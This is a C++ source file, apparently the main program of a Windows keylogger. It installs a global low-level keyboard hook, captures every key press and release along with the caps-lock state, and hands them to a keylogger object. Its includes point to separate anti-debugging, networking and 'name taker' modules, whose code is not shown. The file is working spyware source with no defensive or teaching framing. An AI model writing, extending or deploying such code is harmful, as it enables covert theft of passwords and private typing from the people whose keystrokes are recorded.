#include "common.h"
#include "keylogger.h"
#include "keylogger_antidebugg.h"
#include "kqnet.h"
#include "nameTaker.h"
#include <Windows.h>
#include <iostream>

keylogger transKeys;

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        keyStatus status = keyStatus::keyUp;
        PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            status = keyStatus::keyDown;
        } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
        }
        SHORT capsLockState = GetKeyState(VK_CAPITAL);
        bool caps = capsLockState & 0x0001;
        transKeys.handleKeyStroke(p->vkCode, status, caps);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboardHook =
        SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, 0);
    if (keyboardHook == NULL) {
        std::cout << "Failed to install keyboard hook!" << std::endl;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(keyboardHook);

    return 0;
}